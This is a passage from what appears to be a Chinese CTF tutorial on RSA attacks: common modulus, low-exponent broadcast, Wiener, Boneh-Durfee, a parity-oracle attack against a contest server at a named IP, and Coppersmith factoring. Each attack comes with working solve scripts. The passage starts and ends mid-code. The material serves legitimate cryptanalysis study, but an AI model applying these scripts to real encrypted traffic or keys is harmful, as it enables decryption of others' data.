0x17AE4F9BD4FF06B94C46DCBB7070070C7C23C4E8728BE3173CA815FCA5471C0BB35B19ED8838530ABB27D69B1C9D87229D0658D807D8EF74D732576DF4FBA9CD611FC768BE6047C52E8168A1C77E0E54D4877DC20A73FC3A2DB35DDE8700E79BAF61676BF6B6B27032E6B9F3A02F3FAAAFF36251BF2935D9CB45EFAC13D0974484C3D53C2A66A3D279D2B1B594F3797C0B8D33409161F7293EECB5287F45DA104020F0215BCC824338AD4A316E25E4A167A6E4928AF122FA0A55C4E55DEE01A4E0EED89F4B290BF79B5CAFE797AE4FA4B369E043AA0DFE91487E9054FF843EA249ED7945C8A911796F81A0F82EB5694A2FE2EBFF13A9E6DF3334FCAA1C63CBAC3e = 0x14e9914b4cb427de38ac7956930f417ca8e46db1bb3fd343fef9825d467140aceb480dae5b164a7d2b0d2c5c4cbc2a3360409918173efee1d26f26b3020985bfb2675529710e6e61e4f3a960e9474ee5e14666f2fba26a535d73360242b2424e1a56a21e1c314da9b112444388767fa6cba8d94487382787d6c531fa2d131489605b161a09a5ca6999d479b2124a1f203907407ce1ac2f627ad8bc1911f66d9c4f2e2b974b43018a87b01bb8055b191d4a8f8dbd17ecbace3ec4b6f84b606830c282eb512cf51edf0a535bedda909cbf55c68a5ffca3c802def58ef9a0cbabd62d626f95fdc4eeb56d1d30ded03d81061c7093322bbd7b6ceb957a12583aa2625d1 = 16390828876181053318339100750675858805085075693347294634845140223155300471343339735725090534836292007632963907771855159582051536368599877409046147073794159158745099750588781353203665310135991045663088765613847315146223892540146656146285947287434457737619192355597891759277954557284874079842576095414413634632218060041204741585014292743457235750761832960116264601238658366251628950826877369616205949504632422319118366206008416080422671942922507275909660907589263322598929672262664264325308446859589845055502830104300952306424775575141740987190395212323715203016486280360859837271948470735247258851655355384807804629939e1 = 0x01583f58ca9230c4f8844c7f33d61983c27bf611947a1dce390073038805175b18f245543b61c6eaab46a572d03426476e9aecc34716cdac9e33f031f5381d18cf212a8191f826dd10e04fdb506ba9fd91e4831d8adc4c75aa2aa6132e7e48eac66d7ecf24428295eb1b7c64480cf170be83bcd853f9779e6df5999c2beef838d2f0c4d8fc4d9c8e4c6c37259446689ec30634bcd68f293c58cd44039be6299f92649620d6e6017dfd6007d1bd012df7cabec459e0e983f17b5051af4a4fca5cc71cdd72a6f4808e73f833917c2f54801bd9a06e3599edb9a62936764ce084dbf555c16f9e4781ead6fd39792476c6dfc0dd05ada281f75111efd7528065d9e35bp , q = facN(n,e1,d1)d=gmpy2.invert(e,(p-1)*(q-1))t=pow(m, d, n)#t = '484954427b7468657920736179207468617420686973746f7279206973207772697474656e2062792074686520766963746f72737d'print hex(t)[2:].decode('hex') 公共模数攻击公共模数就是指用相同的n加密同一段密文，这样做是十分危险的，因为我们可以利用数学推导绕过d直接得到明文。具体的推导如下：我们假设m为信息明文，两个加密公钥分别为e1和e2，公共模数是n，则有$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 因为e1与e2互质，故我们用欧几里得算法能够找到s1和s2满足下面的关系$$e_1^{s1}+e_2^{s2}=1$$ 式中的s1和s2皆为整数，但是一正一负。我们假设s1为正数，s2为负数因为$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1} mod(n))^{s1}\times (m^{e2} mod(n))^{s2}) mod(n)$$ 根据模运算性质，可以化简为$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1})^{s1}\times (m^{e2})^{s2}) mod(n)$$ 即$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^{e1^{s1}+e2^{s2}}) mod(n)$$ 又因为前面提到过$$e_1^{s1}+e_2^{s2}=1$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^1) mod(n)$$ 即$$C_1^{s1}\times C_2^{s2} = m$$ 这样我们就可以通过c1,c2,e1和e2得到密文了脚本如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: utf-8 -*-from gmpy2 import invert#可以使用libnum包中的n2s或者自己写一个#from libnum import n2sdef n2s(num): t = hex(num)[2:] if len(t) % 2 == 1: return ('0'+t).decode('hex') return t.decode('hex')#欧几里得算法def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)if __name__ == '__main__': print "模数n：" n = input () print "密文C1：" c1 = input () print "密文C2：" c2 = input () print "公钥e1：" e1 = input () print "公钥e2：" e2 = input () s = egcd(e1, e2) s1 = s[1] s2 = s[2] #求模反元素 if s1&lt;0: s1 = - s1 c1 = invert(c1, n) elif s2&lt;0: s2 = - s2 c2 = invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n print n2s(m) 当然还有这种类型的共模攻击,脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# -*- coding: utf-8 -*-import sys,gmpy,base64def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mdef pad_even(x):#重要！凑齐2位，将0x1 变成 0x01 return ('', '0')[len(x)%2] + xdef CipherB2n(c):#将base64编码后的密文转成数字 c2 = base64.b64decode(c) temp = '' for i in c2: temp += pad_even(str(hex(ord(i)))[2:]) temp = eval('0x'+temp) return (temp)def CipherN2b(m):#将数字转换成ascii hex_m=hex(m)[2:] if hex_m[-1] == 'L' : hex_m=hex_m[:-1] return hex_m.decode('hex')if __name__ == '__main__': sys.setrecursionlimit(1000000) e1 = 2333 #根据分解结果 e2 = 23333 #根据分解结果 s = egcd(e1, e2) s1 = s[1] s2 = s[2] c1 = 'XSKBJ2biS6brC5iGwU0GZitHdVM3HXAiwtFnVf2+HTaUqFahxL+BxBi2QDcx7gLxcjEWCMwFP6DS92nMAU4r0gPWSEUIoY57sgNZsjDIDAukiYeLNDUgYz+1P+nF4fk7gwPdozrIvAXGDBvMBjuviqsC8vmVP3I6eLLkt9C46HFt0SBw5ycfAjVoDF2r7/4B1UDs4G0dpIDUCk4khezzgqspn6tqtwOGB27vrKegoL/FlwmutFYIuRKKCBKx3yc/qfWXZ84Oo8nPqgaxgDlxWeLtGM9ZouwFKnagmjbnH+58Pescw4XYafXKqFjQz3XrK/uUESE8jIEIPeL1+8yUpw==' c2 ='EruzwVAXSVLC3rldjcsx6HO0UUICdR9xxgr9eWNhIW0T8l2O3yT/LlFLK2+YU0HB97xr5HaiZesk4T6IuJ9+iOzB8YSkWMfYvOSDKn7Jng/1Q3wQuoldm+UurmZkiEs9kFi+EhsCNAbVAnLzLXLwzYm3emamueDqru4Doo/lSMz8p0+jqz24HscJN9shU85WX4JngW92REHHV8rPHaisCdxeAs+uPyTNzO4IbwDaJvw3ZR/Lo4m1K2Qw8PbYnOcgVr9CWR7mVyxofoWk6qWpQf3d0fX6wbbPcQkXxnnqLWy5S3PZcNQa1wkfRTJJO03QmNVsOivXGb3GzmeZbxmVhQ==' c1 = CipherB2n(c1) c2 = CipherB2n(c2) #print hex(c1) n = 17362520124149736059291605717839814089431261833972408175766504894876091272021197374480215582589878198406028065354454242540322618614670160317701698407729515781811530180885334265851364490357884909336085410775168953942120359215038925025305363480538685487988827339463890539279008285241711326041868183805848503077373967082910932422798165242481154593794712639251157856102009630894845049984346776659339380886766804814959778048440996937820138560802077375885700500737699904011032451007341777160586467318264288370080315519305800247682611802774996999330812534723806925426052547128371180683265963525581842037399869323246530085399 #共n if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m=(pow(c1,s1,n)*pow(c2,s2,n)) % n print m print CipherN2b(m) 低加密指数广播攻击如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： $$C_1\equiv m^{e} mod(n_1)$$$$C_2\equiv m^{e} mod(n_2)$$$$C_3\equiv m^{e} mod(n_3)$$ 对上述等式运用中国剩余定理，在e=3时，可以得到： $$C_x\equiv m^{3} mod(n_1n_2n_3)$$ 通过对Cx进行三次开方可以求得明文。 例题:XCTF 4th-WHCTF-2017 OldDriver题目给了如下信息：12345678910[&#123;&quot;c&quot;: 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, &quot;e&quot;: 10, &quot;n&quot;: 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;&quot;c&quot;: 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, &quot;e&quot;: 10, &quot;n&quot;: 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;&quot;c&quot;: 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, &quot;e&quot;: 10, &quot;n&quot;: 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;&quot;c&quot;: 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, &quot;e&quot;: 10, &quot;n&quot;: 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;&quot;c&quot;: 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, &quot;e&quot;: 10, &quot;n&quot;: 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;&quot;c&quot;: 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, &quot;e&quot;: 10, &quot;n&quot;: 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;&quot;c&quot;: 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, &quot;e&quot;: 10, &quot;n&quot;: 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;&quot;c&quot;: 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, &quot;e&quot;: 10, &quot;n&quot;: 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;&quot;c&quot;: 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, &quot;e&quot;: 10, &quot;n&quot;: 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;&quot;c&quot;: 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, &quot;e&quot;: 10, &quot;n&quot;: 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;] 脚本如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# coding:utf8from struct import pack,unpackimport zlibimport gmpydef my_parse_number(number): string = "%x" % number #if len(string) != 64: # return "" erg = [] while string != '': erg = erg + [chr(int(string[:2], 16))] string = string[2:] return ''.join(erg)def extended_gcd(a, b): x,y = 0, 1 lastx, lasty = 1, 0 while b: a, (q, b) = b, divmod(a,b) x, lastx = lastx-q*x, x y, lasty = lasty-q*y, y return (lastx, lasty, a)def chinese_remainder_theorem(items): N = 1 for a, n in items: N *= n result = 0 for a, n in items: m = N/n r, s, d = extended_gcd(n, m) if d != 1: N=N/n continue #raise "Input not pairwise co-prime" result += a*s*m return result % N, Nsessions=[&#123;"c": 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, "e": 10, "n": 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;"c": 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, "e": 10, "n": 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;"c": 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, "e": 10, "n": 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;"c": 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, "e": 10, "n": 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;"c": 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, "e": 10, "n": 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;"c": 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, "e": 10, "n": 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;"c": 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, "e": 10, "n": 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;"c": 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, "e": 10, "n": 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;"c": 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, "e": 10, "n": 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;"c": 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, "e": 10, "n": 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;]data = []for session in sessions: e=session['e'] n=session['n'] msg=session['c'] data = data + [(msg, n)]print "Please wait, performing CRT"x, n = chinese_remainder_theorem(data)e=session['e']realnum = gmpy.mpz(x).root(e)[0].digits()print my_parse_number(int(realnum)) 低解密指数攻击与低加密指数相同，低解密指数可以加快解密的过程，但是相对的也带来了安全问题。 1.Wiener攻击在RSA系统中，如果以下条件满足：$$q &lt; p &lt; 2q$$且$$d &lt; n^{1/4}$$那么我们就可以利用连分数的渐进分数攻击得到d 原理 利用脚本如下：12345678910111213141516171819from sage.all import continued_fraction, Integer, inverse_moddef wiener(e, n): q0 = 1 M = 1333337 C = pow(M, e, n) for x in continued_fraction(Integer(e) / Integer(n)).convergents(): q1 = int(x.denominator()) # see Andrej Dujella. "A variant of Wiener’s attack on RSA" for r in range(10): for s in range(10): d = r*q1 + s*q0 if pow(C, d, n) == M: return d q0 = q1e = xxxn = xxxd = wiener(e, n) 例题:ASIS-CTF-Finals-2017 Gracias题目给了类似RSA的算法的公钥和密文，并且脚本中可以发现是先生成比较小的d再生成的e。同时n是由三个质数相乘生成的，不过并不影响使用wiener攻击。解题脚本如下123456789101112131415161718192021222324252627from sage.all import continued_fraction, Integer, inverse_modpubkey = (1696852658826990842058316561963467335977986730245296081842693913454799128341723605666024757923000936875008280288574503060506225324560725525210728761064310034604441130912702077320696660565727540525259413564999213382434231194132697630244074950529107794905761549606578049632101483460345878198682237227139704889943489709170676301481918176902970896183163611197618458670928730764124354693594769219086662173889094843054787693685403229558143793832013288487194871165461567L, 814161885590044357190593282132583612817366020133424034468187008267919006610450334193936389251944312061685926620628676079561886595567219325737685515818965422518820810326234612624290774570873983198113409686391355443155606621049101005048872030700143084978689888823664771959905075795440800042648923901406744546140059930315752131296763893979780940230041254506456283030727953969468933552050776243515721233426119581636614777596169466339421956338478341355508343072697451L, 171012227587318507773834753911094468358648971527111097308935888531930900156798659257578479378777764146070352809723708236353390208094909385240006920137781562826981091183813955039359863361624869703055918575613667858215532572602435432258750639197322091887713402631456113333645709142822182724397962837201266977523L, 96969753191136466007366303619618019752521508403657426306543836447071659732926802256183021740376016065813234292694535879838415771865207311953800116203362150588941093508091412441933752168889516206420588410478242229762908362637083786338280959547015086176046206126019992386890758970740552952647510652431386064722L)c=(1569733526826523065259704222721381245770313117205865099913421859731162526943498524936251685846967970606251353344665893442015804015671457823645874503670136308040791285744658847419176471348768113798503897694020110157476679833746227801224812046930570487233225157924912272791212802495997329083436189937249314855532400635293522270501567950040825794060896420481676398789310029592608176167251882124182145471818654414925639589921023176070657483148482403065241178276749773L, 139537660044872985880471632333334179976891152860359271230202507995985566816703080930428310461057387079799847266510420206696052591677854190150642820963140050439023069266243433278700748622126726137374130247097863526461696642750021196138340072411724739383716017406022211953417323065831672315854246554523225039827L)def wiener(e, n): q0 = 1 M = 1333337 C = pow(M, e, n) for x in continued_fraction(Integer(e) / Integer(n)).convergents(): q1 = int(x.denominator()) # see Andrej Dujella. "A variant of Wiener’s attack on RSA" for r in range(10): for s in range(10): d = r*q1 + s*q0 if pow(C, d, n) == M: return d q0 = q1n, e, a, g = pubkeyc1, c2 = cd = wiener(e, n)# d = 100556095937036905102538523179832446199526507742826168666218687736467897968451k = pow(c1, d, n)K = pow(g, k, a)print '&#123;:x&#125;'.format(c2 * inverse_mod(K, a) % a).decode('hex') 并且这道题也可以用Boneh-Durfee attack做，脚本如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from sage.all import *# Original: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sagedimension_min = 7def remove_unhelpful(BB, monomials, bound, current): if current == -1 or BB.dimensions()[0] &lt;= dimension_min: return BB for ii in range(current, -1, -1): if BB[ii, ii] &gt;= bound: affected_vectors = 0 affected_vector_index = 0 for jj in range(ii + 1, BB.dimensions()[0]): if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj if affected_vectors == 0: #print "* removing unhelpful vector", ii BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): if BB[kk, affected_vector_index] != 0: affected_deeper = False if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]): #print "* removing unhelpful vectors", ii, "and", affected_vector_index BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB return BBdef boneh_durfee_small_roots(pol, modulus, mm, tt, XX, YY): PR.&lt;u, x, y&gt; = PolynomialRing(ZZ) Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): if monomial not in monomials: monomials.append(monomial) monomials.sort() for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) monomials.append(u^kk * y^jj) nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) nn = BB.dimensions()[0] if nn == 0: print "failure" return 0,0 BB = BB.LLL() PR.&lt;w,z&gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[0, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[1, jj] / monomials[jj](UU,XX,YY) PR.&lt;q&gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) if rr.is_zero() or rr.monomials() == [1]: print "the two first vectors are not independant" return 0, 0 rr = rr(q, q) soly = rr.roots() if len(soly) == 0: print "Your prediction (delta) is too small" return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] return solx, solydef boneh_durfee(n, e): delta = RR(0.167) # d ~ n^0.167 m = 5 t = round((1-2*delta) * m) X = ZZ(2*floor(n^delta)) # we have n = p^2q. so `phi(n) = n + &#123;-(pq+pr+qr) + p+q+r)&#125; - 1`. # we reconsidered boneh-durfee's attack then we have `x(A+y) + 1 = 0 mod e` where `A = (n-1)` # and (x, y) = (k, -(pq+pr+qr)+p+q+r). Y = ZZ(floor(n^(2/3))) P.&lt;x,y&gt; = PolynomialRing(ZZ) A = ZZ((n-1)/2) pol = 1 + x * (A + y) solx, soly = boneh_durfee_small_roots(pol, e, m, t, X, Y) print solx, soly if solx &gt; 0: return int(pol(solx, soly) / e) return 0if __name__ == "__main__": N = 1696852658826990842058316561963467335977986730245296081842693913454799128341723605666024757923000936875008280288574503060506225324560725525210728761064310034604441130912702077320696660565727540525259413564999213382434231194132697630244074950529107794905761549606578049632101483460345878198682237227139704889943489709170676301481918176902970896183163611197618458670928730764124354693594769219086662173889094843054787693685403229558143793832013288487194871165461567 e = 814161885590044357190593282132583612817366020133424034468187008267919006610450334193936389251944312061685926620628676079561886595567219325737685515818965422518820810326234612624290774570873983198113409686391355443155606621049101005048872030700143084978689888823664771959905075795440800042648923901406744546140059930315752131296763893979780940230041254506456283030727953969468933552050776243515721233426119581636614777596169466339421956338478341355508343072697451 print boneh_durfee(N, e) 选择密文攻击在这类攻击中我们可以传给服务器不同的密文，并且得到一些回复。通过这些回复以及已知信息可以破译明文 1.Bit Oracle Attack问题描述假设用户知道N，e，c，并且可以构造任意密文c1，返回此密文解密后p1的末尾的某些比特的性质(记为函数f)，最常见的函数f就是表示p1的奇偶性 原理攻击者得到密文$$ C = P^e mod (n)$$将其乘以$$ 2^e mod (n) $$并作为密文发送过去，并且返回f(2P) 如果f(2P)返回的最后一位是0，那么2P &lt; N，即P &lt; N/2如果f(2P)返回的最后一位是1，那么2P &gt; N，即P &gt; N/2 接下来我们来看看2P和4P 如果返回的是（偶，偶），那么有P &lt; N/4如果返回的是（偶，奇），那么有N/4 &lt; P &lt; N/2如果返回的是（奇，偶），那么有N/2 &lt; P &lt; N/4如果返回的是（奇，奇），那么有3N/4 &lt; P &lt; N可以发现规律：P的所在空间回不断的缩小，我们可以通过这种方法得到P 方法$$ C’ = (2^e mod(N))*C $$ 1234if (Oracle(C') == even) UB = (UB + LB)/2;else LB = (UB + LB)/2; 例题:XCTF 4th-QCTF-2018 babyrsa题目给了如下信息:1234567891011e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0nc 111.198.29.45 31954 nc过去之后会有如下返回：123456----------------------------- baby rsa -----------------------------Come and Decode your dataIf you give me ciphertext, I can tell you whether decoded data is even or oddYou can input ciphertext(hexdecimal) now1odd 也就是它可以解密我们传过去的密文并且告诉解密之后的信息是奇数还是偶数 解题脚本如下(由于我自己写的脚本一直有问题，就借鉴了别的大佬的脚本)123456789101112131415161718192021222324252627282930313233343536373839404142434445# coding=utf-8import binasciiimport socketdef getevenOrodd(c): """nc连接获取even or odd""" adress = "111.198.29.45" port = 31954 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((adress, int(port))) s.recv(1024) data = hex(c)[:-1] + "\n" s.send(data) codeindex = s.recv(1024) s.shutdown(1) s.close() print codeindex return codeindexdef decrypt(n): count = 0 LB = 0 UB = n e = 65537 c = int("0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0",16) while LB != UB: print count c1 = (pow(2, e, n) * c) % n print UB-LB if getevenOrodd(c1)[:-1] == "even": UB = (UB + LB) / 2 else: LB = (UB + LB) / 2 c = c1 count +=1 print LBn=int("0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db",16)decrypt(n)LB = 560856645743734814774953158390773525781916094468093308691660509501812320plaintext = binascii.unhexlify(hex(LB)[2:-1])print(plaintext) Coppersmith 相关攻击参考资料 1.Factoring with High Bits Known攻击原理待补充(等我好好学学数论orz) 攻击条件当我们知道一个公钥中模数 N 的一个因子的较高位时，我们就有一定几率来分解 N。 例题:WHCTF-2017 UntitledWP参考此篇文章 题目给了服务器端代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_longimport primefacimport timefrom os import urandomimport hashlibimport sysclass Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr)import syssys.stdout = Unbuffered(sys.stdout)def gen_args(): p=getPrime(1024) q=getPrime(1024) n=p*q e=0x10001 d=primefac.modinv(e,(p-1)*(q-1))%((p-1)*(q-1)) return (p,q,e,n,d)def proof(): salt=urandom(4) print salt.encode("base64"), proof=raw_input("show me your work: ") if hashlib.md5(salt+proof.decode("base64")).hexdigest().startswith("0000"): print "checked success" return 1 return 0def run(): if not proof(): return m=int(open("/home/bibi/PycharmProjects/work/whctf/flag","r").read().encode("hex"),16)#flag&#123;*&#125; (p,q,e,n,d)=gen_args() c=pow(m,e,n) print "n:",hex(n) print "e:",hex(e) print "c:",hex(c) t=int(hex(m)[2:][0:8],16) u=pow(t,e,n) print "u:",hex(u) print "====" x=int(hex(m)[2:][0:8]+raw_input("x: "),16) print "====" y=int(raw_input("y: "),16) if (pow(x,e,n)==y and pow(y,d,n)==t): print "s:",hex(int(bin(p)[2:][0:568],2))run() 第一部分是工作量证明12345678def proof(): salt=urandom(4) print salt.encode("base64"), proof=raw_input("show me your work: ") if hashlib.md5(salt+proof.decode("base64")).hexdigest().startswith("0000"): print "checked success" return 1 return 0 写个脚本爆破就行123456789salt=p.recvline()msg = base64.b64decode(salt)work=""for i in count(): hashid = md5(msg+str(i)).hexdigest() if hashid.startswith('0000'): #print i,hashid work=base64.b64encode(str(i)) break 然后会进入系统，主要关注以下代码12345678910111213141516171819def run(): if not proof(): return m=int(open("/home/bibi/PycharmProjects/work/whctf/flag","r").read().encode("hex"),16)#flag&#123;*&#125; (p,q,e,n,d)=gen_args() c=pow(m,e,n) print "n:",hex(n) print "e:",hex(e) print "c:",hex(c) t=int(hex(m)[2:][0:8],16) #取hex(m)的前八位 t=1718378855 u=pow(t,e,n) print "u:",hex(u) print "====" x=int(hex(m)[2:][0:8]+raw_input("x: "),16) 